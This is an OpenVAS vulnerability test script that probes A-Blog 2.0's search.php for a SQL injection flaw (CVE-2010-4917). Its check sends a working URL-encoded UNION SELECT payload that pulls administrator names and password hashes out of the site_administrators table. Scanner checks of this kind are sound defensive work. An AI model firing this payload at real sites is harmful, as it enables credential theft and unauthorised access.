###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_a-blog_42988.nasl 14 2013-10-27 12:33:37Z jan $
#
# A-Blog 'sources/search.php' SQL Injection Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "A-Blog Simple Blogging System is prone to an SQL-injection
vulnerability because it fails to sufficiently sanitize user-supplied
data before using it in an SQL query.

Exploiting this issue could allow an attacker to compromise the
application, access or modify data, or exploit latent vulnerabilities
in the underlying database.

A-Blog 2.0 is vulnerable; other versions may also be affected.";


if (description)
{
 script_id(100791);
 script_version("$Revision: 14 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2010-09-08 15:41:05 +0200 (Wed, 08 Sep 2010)");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2010-4917");
 script_bugtraq_id(42988);

 script_name("A-Blog 'sources/search.php' SQL Injection Vulnerability");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/42988");
 script_xref(name : "URL" , value : "http://sourceforge.net/projects/a-blog/");

 script_tag(name:"risk_factor", value:"High");
 script_description(desc);
 script_summary("Determine if A-Blog is prone to an SQL-injection vulnerability");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

if(!can_host_php(port:port))exit(0);

dirs = make_list("/blog",cgi_dirs());

foreach dir (dirs) {
   
  url = string(dir, "/search.php?words=%25%27/%2A%2A/UNION/%2A%2A/SELECT/%2A%2A/1%2CCONCAT%28%27%3C1%3E%27%2Cname%2C%27%3A%27%2Cpassword%2C%27%3C2%3E%27%29%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10/%2A%2A/FROM/%2A%2A/site_administrators/%2A%2A/%23"); 

  if(http_vuln_check(port:port, url:url,pattern:"<1>[a-zA-Z0-9]+:[a-fA-F0-9]+<2>")) {
     
    security_hole(port:port);
    exit(0);

  }
}

exit(0);
